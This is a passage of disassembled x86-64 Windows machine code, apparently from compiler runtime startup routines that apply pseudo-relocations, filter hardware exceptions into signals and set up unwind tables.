    69dc389b:	48 83 c0 18          	add    $0x18,%rax
    69dc389f:	90                   	nop
    69dc38a0:	48 8b 10             	mov    (%rax),%rdx
    69dc38a3:	48 39 d3             	cmp    %rdx,%rbx
    69dc38a6:	72 14                	jb     0x69dc38bc
    69dc38a8:	4c 8b 40 08          	mov    0x8(%rax),%r8
    69dc38ac:	45 8b 40 08          	mov    0x8(%r8),%r8d
    69dc38b0:	4c 01 c2             	add    %r8,%rdx
    69dc38b3:	48 39 d3             	cmp    %rdx,%rbx
    69dc38b6:	0f 82 89 00 00 00    	jb     0x69dc3945
    69dc38bc:	83 c1 01             	add    $0x1,%ecx
    69dc38bf:	48 83 c0 28          	add    $0x28,%rax
    69dc38c3:	39 f1                	cmp    %esi,%ecx
    69dc38c5:	75 d9                	jne    0x69dc38a0
    69dc38c7:	48 89 d9             	mov    %rbx,%rcx
    69dc38ca:	e8 41 0c 00 00       	call   0x69dc4510
    69dc38cf:	48 85 c0             	test   %rax,%rax
    69dc38d2:	49 89 c4             	mov    %rax,%r12
    69dc38d5:	0f 84 52 01 00 00    	je     0x69dc3a2d
    69dc38db:	48 8b 05 06 6d 00 00 	mov    0x6d06(%rip),%rax        # 0x69dca5e8
    69dc38e2:	48 8d 34 b6          	lea    (%rsi,%rsi,4),%rsi
    69dc38e6:	48 c1 e6 03          	shl    $0x3,%rsi
    69dc38ea:	48 01 f0             	add    %rsi,%rax
    69dc38ed:	4c 89 60 20          	mov    %r12,0x20(%rax)
    69dc38f1:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
    69dc38f7:	e8 44 0d 00 00       	call   0x69dc4640
    69dc38fc:	41 8b 4c 24 0c       	mov    0xc(%r12),%ecx
    69dc3901:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
    69dc3906:	41 b8 30 00 00 00    	mov    $0x30,%r8d
    69dc390c:	48 01 c1             	add    %rax,%rcx
    69dc390f:	48 8b 05 d2 6c 00 00 	mov    0x6cd2(%rip),%rax        # 0x69dca5e8
    69dc3916:	48 89 4c 30 18       	mov    %rcx,0x18(%rax,%rsi,1)
    69dc391b:	ff 15 bb 8a 00 00    	call   *0x8abb(%rip)        # 0x69dcc3dc
    69dc3921:	48 85 c0             	test   %rax,%rax
    69dc3924:	0f 84 e6 00 00 00    	je     0x69dc3a10
    69dc392a:	8b 44 24 44          	mov    0x44(%rsp),%eax
    69dc392e:	8d 50 fc             	lea    -0x4(%rax),%edx
    69dc3931:	83 e2 fb             	and    $0xfffffffb,%edx
    69dc3934:	74 08                	je     0x69dc393e
    69dc3936:	83 e8 40             	sub    $0x40,%eax
    69dc3939:	83 e0 bf             	and    $0xffffffbf,%eax
    69dc393c:	75 62                	jne    0x69dc39a0
    69dc393e:	83 05 9f 6c 00 00 01 	addl   $0x1,0x6c9f(%rip)        # 0x69dca5e4
    69dc3945:	83 ff 08             	cmp    $0x8,%edi
    69dc3948:	73 29                	jae    0x69dc3973
    69dc394a:	40 f6 c7 04          	test   $0x4,%dil
    69dc394e:	0f 85 90 00 00 00    	jne    0x69dc39e4
    69dc3954:	85 ff                	test   %edi,%edi
    69dc3956:	74 10                	je     0x69dc3968
    69dc3958:	0f b6 45 00          	movzbl 0x0(%rbp),%eax
    69dc395c:	40 f6 c7 02          	test   $0x2,%dil
    69dc3960:	88 03                	mov    %al,(%rbx)
    69dc3962:	0f 85 97 00 00 00    	jne    0x69dc39ff
    69dc3968:	48 83 c4 50          	add    $0x50,%rsp
    69dc396c:	5b                   	pop    %rbx
    69dc396d:	5e                   	pop    %rsi
    69dc396e:	5f                   	pop    %rdi
    69dc396f:	5d                   	pop    %rbp
    69dc3970:	41 5c                	pop    %r12
    69dc3972:	c3                   	ret
    69dc3973:	89 f8                	mov    %edi,%eax
    69dc3975:	83 ef 01             	sub    $0x1,%edi
    69dc3978:	48 8b 54 05 f8       	mov    -0x8(%rbp,%rax,1),%rdx
    69dc397d:	83 ff 08             	cmp    $0x8,%edi
    69dc3980:	48 89 54 03 f8       	mov    %rdx,-0x8(%rbx,%rax,1)
    69dc3985:	72 e1                	jb     0x69dc3968
    69dc3987:	83 e7 f8             	and    $0xfffffff8,%edi
    69dc398a:	31 c0                	xor    %eax,%eax
    69dc398c:	89 c2                	mov    %eax,%edx
    69dc398e:	83 c0 08             	add    $0x8,%eax
    69dc3991:	48 8b 4c 15 00       	mov    0x0(%rbp,%rdx,1),%rcx
    69dc3996:	39 f8                	cmp    %edi,%eax
    69dc3998:	48 89 0c 13          	mov    %rcx,(%rbx,%rdx,1)
    69dc399c:	72 ee                	jb     0x69dc398c
    69dc399e:	eb c8                	jmp    0x69dc3968
    69dc39a0:	48 03 35 41 6c 00 00 	add    0x6c41(%rip),%rsi        # 0x69dca5e8
    69dc39a7:	41 b8 40 00 00 00    	mov    $0x40,%r8d
    69dc39ad:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
    69dc39b2:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
    69dc39b7:	49 89 f1             	mov    %rsi,%r9
    69dc39ba:	48 89 4e 08          	mov    %rcx,0x8(%rsi)
    69dc39be:	48 89 56 10          	mov    %rdx,0x10(%rsi)
    69dc39c2:	ff 15 0c 8a 00 00    	call   *0x8a0c(%rip)        # 0x69dcc3d4
    69dc39c8:	85 c0                	test   %eax,%eax
    69dc39ca:	0f 85 6e ff ff ff    	jne    0x69dc393e
    69dc39d0:	ff 15 26 89 00 00    	call   *0x8926(%rip)        # 0x69dcc2fc
    69dc39d6:	48 8d 0d 9b 37 00 00 	lea    0x379b(%rip),%rcx        # 0x69dc7178
    69dc39dd:	89 c2                	mov    %eax,%edx
    69dc39df:	e8 2c 17 00 00       	call   0x69dc5110
    69dc39e4:	8b 45 00             	mov    0x0(%rbp),%eax
    69dc39e7:	89 ff                	mov    %edi,%edi
    69dc39e9:	89 03                	mov    %eax,(%rbx)
    69dc39eb:	8b 44 3d fc          	mov    -0x4(%rbp,%rdi,1),%eax
    69dc39ef:	89 44 3b fc          	mov    %eax,-0x4(%rbx,%rdi,1)
    69dc39f3:	e9 70 ff ff ff       	jmp    0x69dc3968
    69dc39f8:	31 f6                	xor    %esi,%esi
    69dc39fa:	e9 c8 fe ff ff       	jmp    0x69dc38c7
    69dc39ff:	89 ff                	mov    %edi,%edi
    69dc3a01:	0f b7 44 3d fe       	movzwl -0x2(%rbp,%rdi,1),%eax
    69dc3a06:	66 89 44 3b fe       	mov    %ax,-0x2(%rbx,%rdi,1)
    69dc3a0b:	e9 58 ff ff ff       	jmp    0x69dc3968
    69dc3a10:	48 8b 05 d1 6b 00 00 	mov    0x6bd1(%rip),%rax        # 0x69dca5e8
    69dc3a17:	48 8d 0d 22 37 00 00 	lea    0x3722(%rip),%rcx        # 0x69dc7140
    69dc3a1e:	41 8b 54 24 08       	mov    0x8(%r12),%edx
    69dc3a23:	4c 8b 44 30 18       	mov    0x18(%rax,%rsi,1),%r8
    69dc3a28:	e8 e3 16 00 00       	call   0x69dc5110
    69dc3a2d:	48 8d 0d ec 36 00 00 	lea    0x36ec(%rip),%rcx        # 0x69dc7120
    69dc3a34:	48 89 da             	mov    %rbx,%rdx
    69dc3a37:	e8 d4 16 00 00       	call   0x69dc5110
    69dc3a3c:	90                   	nop
    69dc3a3d:	0f 1f 00             	nopl   (%rax)
    69dc3a40:	55                   	push   %rbp
    69dc3a41:	41 57                	push   %r15
    69dc3a43:	41 56                	push   %r14
    69dc3a45:	41 55                	push   %r13
    69dc3a47:	41 54                	push   %r12
    69dc3a49:	57                   	push   %rdi
    69dc3a4a:	56                   	push   %rsi
    69dc3a4b:	53                   	push   %rbx
    69dc3a4c:	48 83 ec 38          	sub    $0x38,%rsp
    69dc3a50:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
    69dc3a57:	00 
    69dc3a58:	8b 1d 82 6b 00 00    	mov    0x6b82(%rip),%ebx        # 0x69dca5e0
    69dc3a5e:	85 db                	test   %ebx,%ebx
    69dc3a60:	74 11                	je     0x69dc3a73
    69dc3a62:	48 8d 65 b8          	lea    -0x48(%rbp),%rsp
    69dc3a66:	5b                   	pop    %rbx
    69dc3a67:	5e                   	pop    %rsi
    69dc3a68:	5f                   	pop    %rdi
    69dc3a69:	41 5c                	pop    %r12
    69dc3a6b:	41 5d                	pop    %r13
    69dc3a6d:	41 5e                	pop    %r14
    69dc3a6f:	41 5f                	pop    %r15
    69dc3a71:	5d                   	pop    %rbp
    69dc3a72:	c3                   	ret
    69dc3a73:	c7 05 63 6b 00 00 01 	movl   $0x1,0x6b63(%rip)        # 0x69dca5e0
    69dc3a7a:	00 00 00 
    69dc3a7d:	e8 0e 0b 00 00       	call   0x69dc4590
    69dc3a82:	48 98                	cltq
    69dc3a84:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
    69dc3a88:	48 8d 04 c5 1e 00 00 	lea    0x1e(,%rax,8),%rax
    69dc3a8f:	00 
    69dc3a90:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
    69dc3a94:	e8 47 0d 00 00       	call   0x69dc47e0
    69dc3a99:	4c 8b 25 20 39 00 00 	mov    0x3920(%rip),%r12        # 0x69dc73c0
    69dc3aa0:	c7 05 3a 6b 00 00 00 	movl   $0x0,0x6b3a(%rip)        # 0x69dca5e4
    69dc3aa7:	00 00 00 
    69dc3aaa:	48 8b 35 1f 39 00 00 	mov    0x391f(%rip),%rsi        # 0x69dc73d0
    69dc3ab1:	48 29 c4             	sub    %rax,%rsp
    69dc3ab4:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
    69dc3ab9:	48 89 05 28 6b 00 00 	mov    %rax,0x6b28(%rip)        # 0x69dca5e8
    69dc3ac0:	4c 89 e0             	mov    %r12,%rax
    69dc3ac3:	48 29 f0             	sub    %rsi,%rax
    69dc3ac6:	48 83 f8 07          	cmp    $0x7,%rax
    69dc3aca:	7e 96                	jle    0x69dc3a62
    69dc3acc:	48 83 f8 0b          	cmp    $0xb,%rax
    69dc3ad0:	8b 16                	mov    (%rsi),%edx
    69dc3ad2:	0f 8e c8 00 00 00    	jle    0x69dc3ba0
    69dc3ad8:	85 d2                	test   %edx,%edx
    69dc3ada:	0f 84 a4 00 00 00    	je     0x69dc3b84
    69dc3ae0:	4c 39 e6             	cmp    %r12,%rsi
    69dc3ae3:	0f 83 79 ff ff ff    	jae    0x69dc3a62
    69dc3ae9:	4c 8d 76 08          	lea    0x8(%rsi),%r14
    69dc3aed:	49 83 c4 07          	add    $0x7,%r12
    69dc3af1:	4c 8b 2d f8 38 00 00 	mov    0x38f8(%rip),%r13        # 0x69dc73f0
    69dc3af8:	48 8d 7d a8          	lea    -0x58(%rbp),%rdi
    69dc3afc:	4d 29 f4             	sub    %r14,%r12
    69dc3aff:	49 c1 ec 03          	shr    $0x3,%r12
    69dc3b03:	4e 8d 64 e6 08       	lea    0x8(%rsi,%r12,8),%r12
    69dc3b08:	eb 0a                	jmp    0x69dc3b14
    69dc3b0a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    69dc3b10:	49 83 c6 08          	add    $0x8,%r14
    69dc3b14:	8b 4e 04             	mov    0x4(%rsi),%ecx
    69dc3b17:	41 b8 04 00 00 00    	mov    $0x4,%r8d
    69dc3b1d:	48 89 fa             	mov    %rdi,%rdx
    69dc3b20:	8b 06                	mov    (%rsi),%eax
    69dc3b22:	4c 89 f6             	mov    %r14,%rsi
    69dc3b25:	4c 01 e9             	add    %r13,%rcx
    69dc3b28:	03 01                	add    (%rcx),%eax
    69dc3b2a:	89 45 a8             	mov    %eax,-0x58(%rbp)
    69dc3b2d:	e8 3e fd ff ff       	call   0x69dc3870
    69dc3b32:	4d 39 e6             	cmp    %r12,%r14
    69dc3b35:	75 d9                	jne    0x69dc3b10
    69dc3b37:	8b 05 a7 6a 00 00    	mov    0x6aa7(%rip),%eax        # 0x69dca5e4
    69dc3b3d:	31 f6                	xor    %esi,%esi
    69dc3b3f:	4c 8b 25 8e 88 00 00 	mov    0x888e(%rip),%r12        # 0x69dcc3d4
    69dc3b46:	85 c0                	test   %eax,%eax
    69dc3b48:	0f 8e 14 ff ff ff    	jle    0x69dc3a62
    69dc3b4e:	66 90                	xchg   %ax,%ax
    69dc3b50:	48 8b 05 91 6a 00 00 	mov    0x6a91(%rip),%rax        # 0x69dca5e8
    69dc3b57:	48 01 f0             	add    %rsi,%rax
    69dc3b5a:	44 8b 00             	mov    (%rax),%r8d
    69dc3b5d:	45 85 c0             	test   %r8d,%r8d
    69dc3b60:	74 0e                	je     0x69dc3b70
    69dc3b62:	48 8b 50 10          	mov    0x10(%rax),%rdx
    69dc3b66:	49 89 f9             	mov    %rdi,%r9
    69dc3b69:	48 8b 48 08          	mov    0x8(%rax),%rcx
    69dc3b6d:	41 ff d4             	call   *%r12
    69dc3b70:	83 c3 01             	add    $0x1,%ebx
    69dc3b73:	48 83 c6 28          	add    $0x28,%rsi
    69dc3b77:	3b 1d 67 6a 00 00    	cmp    0x6a67(%rip),%ebx        # 0x69dca5e4
    69dc3b7d:	7c d1                	jl     0x69dc3b50
    69dc3b7f:	e9 de fe ff ff       	jmp    0x69dc3a62
    69dc3b84:	8b 4e 04             	mov    0x4(%rsi),%ecx
    69dc3b87:	85 c9                	test   %ecx,%ecx
    69dc3b89:	0f 85 51 ff ff ff    	jne    0x69dc3ae0
    69dc3b8f:	8b 56 08             	mov    0x8(%rsi),%edx
    69dc3b92:	85 d2                	test   %edx,%edx
    69dc3b94:	75 1d                	jne    0x69dc3bb3
    69dc3b96:	8b 56 0c             	mov    0xc(%rsi),%edx
    69dc3b99:	48 83 c6 0c          	add    $0xc,%rsi
    69dc3b9d:	0f 1f 00             	nopl   (%rax)
    69dc3ba0:	85 d2                	test   %edx,%edx
    69dc3ba2:	0f 85 38 ff ff ff    	jne    0x69dc3ae0
    69dc3ba8:	8b 46 04             	mov    0x4(%rsi),%eax
    69dc3bab:	85 c0                	test   %eax,%eax
    69dc3bad:	0f 85 2d ff ff ff    	jne    0x69dc3ae0
    69dc3bb3:	8b 56 08             	mov    0x8(%rsi),%edx
    69dc3bb6:	83 fa 01             	cmp    $0x1,%edx
    69dc3bb9:	0f 85 2f 01 00 00    	jne    0x69dc3cee
    69dc3bbf:	4c 8b 2d 2a 38 00 00 	mov    0x382a(%rip),%r13        # 0x69dc73f0
    69dc3bc6:	48 83 c6 0c          	add    $0xc,%rsi
    69dc3bca:	49 bf 00 00 00 00 ff 	movabs $0xffffffff00000000,%r15
    69dc3bd1:	ff ff ff 
    69dc3bd4:	4c 8d 75 a8          	lea    -0x58(%rbp),%r14
    69dc3bd8:	4c 39 e6             	cmp    %r12,%rsi
    69dc3bdb:	72 48                	jb     0x69dc3c25
    69dc3bdd:	e9 80 fe ff ff       	jmp    0x69dc3a62
    69dc3be2:	0f 86 b8 00 00 00    	jbe    0x69dc3ca0
    69dc3be8:	83 fa 20             	cmp    $0x20,%edx
    69dc3beb:	0f 84 7f 00 00 00    	je     0x69dc3c70
    69dc3bf1:	83 fa 40             	cmp    $0x40,%edx
    69dc3bf4:	0f 85 e0 00 00 00    	jne    0x69dc3cda
    69dc3bfa:	48 8b 11             	mov    (%rcx),%rdx
    69dc3bfd:	41 b8 08 00 00 00    	mov    $0x8,%r8d
    69dc3c03:	4c 89 f7             	mov    %r14,%rdi
    69dc3c06:	48 29 c2             	sub    %rax,%rdx
    69dc3c09:	4c 01 ca             	add    %r9,%rdx
    69dc3c0c:	48 89 55 a8          	mov    %rdx,-0x58(%rbp)
    69dc3c10:	4c 89 f2             	mov    %r14,%rdx
    69dc3c13:	e8 58 fc ff ff       	call   0x69dc3870
    69dc3c18:	48 83 c6 0c          	add    $0xc,%rsi
    69dc3c1c:	4c 39 e6             	cmp    %r12,%rsi
    69dc3c1f:	0f 83 12 ff ff ff    	jae    0x69dc3b37
    69dc3c25:	8b 4e 04             	mov    0x4(%rsi),%ecx
    69dc3c28:	8b 06                	mov    (%rsi),%eax
    69dc3c2a:	0f b6 56 08          	movzbl 0x8(%rsi),%edx
    69dc3c2e:	4c 01 e9             	add    %r13,%rcx
    69dc3c31:	4c 01 e8             	add    %r13,%rax
    69dc3c34:	83 fa 10             	cmp    $0x10,%edx
    69dc3c37:	4c 8b 08             	mov    (%rax),%r9
    69dc3c3a:	75 a6                	jne    0x69dc3be2
    69dc3c3c:	44 0f b7 01          	movzwl (%rcx),%r8d
    69dc3c40:	4c 89 f2             	mov    %r14,%rdx
    69dc3c43:	4c 89 f7             	mov    %r14,%rdi
    69dc3c46:	4d 89 c2             	mov    %r8,%r10
    69dc3c49:	49 81 ca 00 00 ff ff 	or     $0xffffffffffff0000,%r10
    69dc3c50:	66 45 85 c0          	test   %r8w,%r8w
    69dc3c54:	4d 0f 48 c2          	cmovs  %r10,%r8
    69dc3c58:	49 29 c0             	sub    %rax,%r8
    69dc3c5b:	4d 01 c8             	add    %r9,%r8
    69dc3c5e:	4c 89 45 a8          	mov    %r8,-0x58(%rbp)
    69dc3c62:	41 b8 02 00 00 00    	mov    $0x2,%r8d
    69dc3c68:	e8 03 fc ff ff       	call   0x69dc3870
    69dc3c6d:	eb a9                	jmp    0x69dc3c18
    69dc3c6f:	90                   	nop
    69dc3c70:	8b 11                	mov    (%rcx),%edx
    69dc3c72:	4c 89 f7             	mov    %r14,%rdi
    69dc3c75:	49 89 d0             	mov    %rdx,%r8
    69dc3c78:	4c 09 fa             	or     %r15,%rdx
    69dc3c7b:	45 85 c0             	test   %r8d,%r8d
    69dc3c7e:	49 0f 49 d0          	cmovns %r8,%rdx
    69dc3c82:	41 b8 04 00 00 00    	mov    $0x4,%r8d
    69dc3c88:	48 29 c2             	sub    %rax,%rdx
    69dc3c8b:	4c 01 ca             	add    %r9,%rdx
    69dc3c8e:	48 89 55 a8          	mov    %rdx,-0x58(%rbp)
    69dc3c92:	4c 89 f2             	mov    %r14,%rdx
    69dc3c95:	e8 d6 fb ff ff       	call   0x69dc3870
    69dc3c9a:	e9 79 ff ff ff       	jmp    0x69dc3c18
    69dc3c9f:	90                   	nop
    69dc3ca0:	83 fa 08             	cmp    $0x8,%edx
    69dc3ca3:	75 35                	jne    0x69dc3cda
    69dc3ca5:	44 0f b6 01          	movzbl (%rcx),%r8d
    69dc3ca9:	4c 89 f2             	mov    %r14,%rdx
    69dc3cac:	4c 89 f7             	mov    %r14,%rdi
    69dc3caf:	4d 89 c2             	mov    %r8,%r10
    69dc3cb2:	49 81 ca 00 ff ff ff 	or     $0xffffffffffffff00,%r10
    69dc3cb9:	45 84 c0             	test   %r8b,%r8b
    69dc3cbc:	4d 0f 48 c2          	cmovs  %r10,%r8
    69dc3cc0:	49 29 c0             	sub    %rax,%r8
    69dc3cc3:	4d 01 c8             	add    %r9,%r8
    69dc3cc6:	4c 89 45 a8          	mov    %r8,-0x58(%rbp)
    69dc3cca:	41 b8 01 00 00 00    	mov    $0x1,%r8d
    69dc3cd0:	e8 9b fb ff ff       	call   0x69dc3870
    69dc3cd5:	e9 3e ff ff ff       	jmp    0x69dc3c18
    69dc3cda:	48 8d 0d f7 34 00 00 	lea    0x34f7(%rip),%rcx        # 0x69dc71d8
    69dc3ce1:	48 c7 45 a8 00 00 00 	movq   $0x0,-0x58(%rbp)
    69dc3ce8:	00 
    69dc3ce9:	e8 22 14 00 00       	call   0x69dc5110
    69dc3cee:	48 8d 0d ab 34 00 00 	lea    0x34ab(%rip),%rcx        # 0x69dc71a0
    69dc3cf5:	e8 16 14 00 00       	call   0x69dc5110
    69dc3cfa:	90                   	nop
    69dc3cfb:	90                   	nop
    69dc3cfc:	90                   	nop
    69dc3cfd:	90                   	nop
    69dc3cfe:	90                   	nop
    69dc3cff:	90                   	nop
    69dc3d00:	48 83 ec 28          	sub    $0x28,%rsp
    69dc3d04:	8b 01                	mov    (%rcx),%eax
    69dc3d06:	3d 91 00 00 c0       	cmp    $0xc0000091,%eax
    69dc3d0b:	77 63                	ja     0x69dc3d70
    69dc3d0d:	3d 8d 00 00 c0       	cmp    $0xc000008d,%eax
    69dc3d12:	73 7b                	jae    0x69dc3d8f
    69dc3d14:	3d 08 00 00 c0       	cmp    $0xc0000008,%eax
    69dc3d19:	0f 84 05 01 00 00    	je     0x69dc3e24
    69dc3d1f:	0f 87 cb 00 00 00    	ja     0x69dc3df0
    69dc3d25:	3d 02 00 00 80       	cmp    $0x80000002,%eax
    69dc3d2a:	0f 84 f4 00 00 00    	je     0x69dc3e24
    69dc3d30:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
    69dc3d35:	0f 85 c3 00 00 00    	jne    0x69dc3dfe
    69dc3d3b:	31 d2                	xor    %edx,%edx
    69dc3d3d:	b9 0b 00 00 00       	mov    $0xb,%ecx
    69dc3d42:	e8 f9 0f 00 00       	call   0x69dc4d40
    69dc3d47:	48 83 f8 01          	cmp    $0x1,%rax
    69dc3d4b:	0f 84 2f 01 00 00    	je     0x69dc3e80
    69dc3d51:	48 85 c0             	test   %rax,%rax
    69dc3d54:	0f 84 3c 01 00 00    	je     0x69dc3e96
    69dc3d5a:	b9 0b 00 00 00       	mov    $0xb,%ecx
    69dc3d5f:	ff d0                	call   *%rax
    69dc3d61:	31 c0                	xor    %eax,%eax
    69dc3d63:	48 83 c4 28          	add    $0x28,%rsp
    69dc3d67:	c3                   	ret
    69dc3d68:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    69dc3d6f:	00 
    69dc3d70:	3d 94 00 00 c0       	cmp    $0xc0000094,%eax
    69dc3d75:	0f 84 b5 00 00 00    	je     0x69dc3e30
    69dc3d7b:	77 37                	ja     0x69dc3db4
    69dc3d7d:	3d 92 00 00 c0       	cmp    $0xc0000092,%eax
    69dc3d82:	0f 84 9c 00 00 00    	je     0x69dc3e24
    69dc3d88:	3d 93 00 00 c0       	cmp    $0xc0000093,%eax
    69dc3d8d:	75 6f                	jne    0x69dc3dfe
    69dc3d8f:	31 d2                	xor    %edx,%edx
    69dc3d91:	b9 08 00 00 00       	mov    $0x8,%ecx
    69dc3d96:	e8 a5 0f 00 00       	call   0x69dc4d40
    69dc3d9b:	48 83 f8 01          	cmp    $0x1,%rax
    69dc3d9f:	74 6f                	je     0x69dc3e10
    69dc3da1:	48 85 c0             	test   %rax,%rax
    69dc3da4:	74 58                	je     0x69dc3dfe
    69dc3da6:	b9 08 00 00 00       	mov    $0x8,%ecx
    69dc3dab:	ff d0                	call   *%rax
    69dc3dad:	31 c0                	xor    %eax,%eax
    69dc3daf:	48 83 c4 28          	add    $0x28,%rsp
    69dc3db3:	c3                   	ret
    69dc3db4:	3d 95 00 00 c0       	cmp    $0xc0000095,%eax
    69dc3db9:	74 69                	je     0x69dc3e24
    69dc3dbb:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
    69dc3dc0:	75 3c                	jne    0x69dc3dfe
    69dc3dc2:	31 d2                	xor    %edx,%edx
    69dc3dc4:	b9 04 00 00 00       	mov    $0x4,%ecx
    69dc3dc9:	e8 72 0f 00 00       	call   0x69dc4d40
    69dc3dce:	48 83 f8 01          	cmp    $0x1,%rax
    69dc3dd2:	0f 84 88 00 00 00    	je     0x69dc3e60
    69dc3dd8:	48 85 c0             	test   %rax,%rax
    69dc3ddb:	0f 84 b5 00 00 00    	je     0x69dc3e96
    69dc3de1:	b9 04 00 00 00       	mov    $0x4,%ecx
    69dc3de6:	ff d0                	call   *%rax
    69dc3de8:	31 c0                	xor    %eax,%eax
    69dc3dea:	48 83 c4 28          	add    $0x28,%rsp
    69dc3dee:	c3                   	ret
    69dc3def:	90                   	nop
    69dc3df0:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
    69dc3df5:	74 cb                	je     0x69dc3dc2
    69dc3df7:	3d 8c 00 00 c0       	cmp    $0xc000008c,%eax
    69dc3dfc:	74 26                	je     0x69dc3e24
    69dc3dfe:	b8 01 00 00 00       	mov    $0x1,%eax
    69dc3e03:	48 83 c4 28          	add    $0x28,%rsp
    69dc3e07:	c3                   	ret
    69dc3e08:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    69dc3e0f:	00 
    69dc3e10:	ba 01 00 00 00       	mov    $0x1,%edx
    69dc3e15:	b9 08 00 00 00       	mov    $0x8,%ecx
    69dc3e1a:	e8 21 0f 00 00       	call   0x69dc4d40
    69dc3e1f:	e8 ac 09 00 00       	call   0x69dc47d0
    69dc3e24:	31 c0                	xor    %eax,%eax
    69dc3e26:	48 83 c4 28          	add    $0x28,%rsp
    69dc3e2a:	c3                   	ret
    69dc3e2b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
    69dc3e30:	31 d2                	xor    %edx,%edx
    69dc3e32:	b9 08 00 00 00       	mov    $0x8,%ecx
    69dc3e37:	e8 04 0f 00 00       	call   0x69dc4d40
    69dc3e3c:	48 83 f8 01          	cmp    $0x1,%rax
    69dc3e40:	0f 85 5b ff ff ff    	jne    0x69dc3da1
    69dc3e46:	ba 01 00 00 00       	mov    $0x1,%edx
    69dc3e4b:	b9 08 00 00 00       	mov    $0x8,%ecx
    69dc3e50:	e8 eb 0e 00 00       	call   0x69dc4d40
    69dc3e55:	31 c0                	xor    %eax,%eax
    69dc3e57:	e9 07 ff ff ff       	jmp    0x69dc3d63
    69dc3e5c:	0f 1f 40 00          	nopl   0x0(%rax)
    69dc3e60:	ba 01 00 00 00       	mov    $0x1,%edx
    69dc3e65:	b9 04 00 00 00       	mov    $0x4,%ecx
    69dc3e6a:	e8 d1 0e 00 00       	call   0x69dc4d40
    69dc3e6f:	31 c0                	xor    %eax,%eax
    69dc3e71:	e9 ed fe ff ff       	jmp    0x69dc3d63
    69dc3e76:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc3e7d:	00 00 00 
    69dc3e80:	ba 01 00 00 00       	mov    $0x1,%edx
    69dc3e85:	b9 0b 00 00 00       	mov    $0xb,%ecx
    69dc3e8a:	e8 b1 0e 00 00       	call   0x69dc4d40
    69dc3e8f:	31 c0                	xor    %eax,%eax
    69dc3e91:	e9 cd fe ff ff       	jmp    0x69dc3d63
    69dc3e96:	b8 04 00 00 00       	mov    $0x4,%eax
    69dc3e9b:	e9 c3 fe ff ff       	jmp    0x69dc3d63
    69dc3ea0:	41 54                	push   %r12
    69dc3ea2:	55                   	push   %rbp
    69dc3ea3:	57                   	push   %rdi
    69dc3ea4:	56                   	push   %rsi
    69dc3ea5:	53                   	push   %rbx
    69dc3ea6:	48 83 ec 20          	sub    $0x20,%rsp
    69dc3eaa:	e8 91 07 00 00       	call   0x69dc4640
    69dc3eaf:	48 89 c5             	mov    %rax,%rbp
    69dc3eb2:	8b 05 50 67 00 00    	mov    0x6750(%rip),%eax        # 0x69dca608
    69dc3eb8:	85 c0                	test   %eax,%eax
    69dc3eba:	75 25                	jne    0x69dc3ee1
    69dc3ebc:	48 85 ed             	test   %rbp,%rbp
    69dc3ebf:	74 20                	je     0x69dc3ee1
    69dc3ec1:	48 8d 0d 48 33 00 00 	lea    0x3348(%rip),%rcx        # 0x69dc7210
    69dc3ec8:	c7 05 36 67 00 00 01 	movl   $0x1,0x6736(%rip)        # 0x69dca608
    69dc3ecf:	00 00 00 
    69dc3ed2:	e8 a9 05 00 00       	call   0x69dc4480
    69dc3ed7:	48 85 c0             	test   %rax,%rax
    69dc3eda:	74 14                	je     0x69dc3ef0
    69dc3edc:	b8 01 00 00 00       	mov    $0x1,%eax
    69dc3ee1:	48 83 c4 20          	add    $0x20,%rsp
    69dc3ee5:	5b                   	pop    %rbx
    69dc3ee6:	5e                   	pop    %rsi
    69dc3ee7:	5f                   	pop    %rdi
    69dc3ee8:	5d                   	pop    %rbp
    69dc3ee9:	41 5c                	pop    %r12
    69dc3eeb:	c3                   	ret
    69dc3eec:	0f 1f 40 00          	nopl   0x0(%rax)
    69dc3ef0:	48 8d 1d 29 68 00 00 	lea    0x6829(%rip),%rbx        # 0x69dca720
    69dc3ef7:	b9 30 00 00 00       	mov    $0x30,%ecx
    69dc3efc:	31 f6                	xor    %esi,%esi
    69dc3efe:	48 8d 15 1b 67 00 00 	lea    0x671b(%rip),%rdx        # 0x69dca620
    69dc3f05:	48 89 df             	mov    %rbx,%rdi
    69dc3f08:	f3 48 ab             	rep stos %rax,(%rdi)
    69dc3f0b:	4c 8d 25 ee fd ff ff 	lea    -0x212(%rip),%r12        # 0x69dc3d00
    69dc3f12:	b9 20 00 00 00       	mov    $0x20,%ecx
    69dc3f17:	48 89 d7             	mov    %rdx,%rdi
    69dc3f1a:	f3 48 ab             	rep stos %rax,(%rdi)
    69dc3f1d:	49 29 ec             	sub    %rbp,%r12
    69dc3f20:	48 89 d7             	mov    %rdx,%rdi
    69dc3f23:	eb 2e                	jmp    0x69dc3f53
    69dc3f25:	c6 07 09             	movb   $0x9,(%rdi)
    69dc3f28:	48 83 c6 01          	add    $0x1,%rsi
    69dc3f2c:	48 83 c3 0c          	add    $0xc,%rbx
    69dc3f30:	44 89 67 04          	mov    %r12d,0x4(%rdi)
    69dc3f34:	8b 48 0c             	mov    0xc(%rax),%ecx
    69dc3f37:	89 4b f4             	mov    %ecx,-0xc(%rbx)
    69dc3f3a:	03 48 08             	add    0x8(%rax),%ecx
    69dc3f3d:	48 89 f8             	mov    %rdi,%rax
    69dc3f40:	48 83 c7 08          	add    $0x8,%rdi
    69dc3f44:	48 29 e8             	sub    %rbp,%rax
    69dc3f47:	89 43 fc             	mov    %eax,-0x4(%rbx)
    69dc3f4a:	89 4b f8             	mov    %ecx,-0x8(%rbx)
    69dc3f4d:	48 83 fe 20          	cmp    $0x20,%rsi
    69dc3f51:	74 32                	je     0x69dc3f85
    69dc3f53:	48 89 f1             	mov    %rsi,%rcx
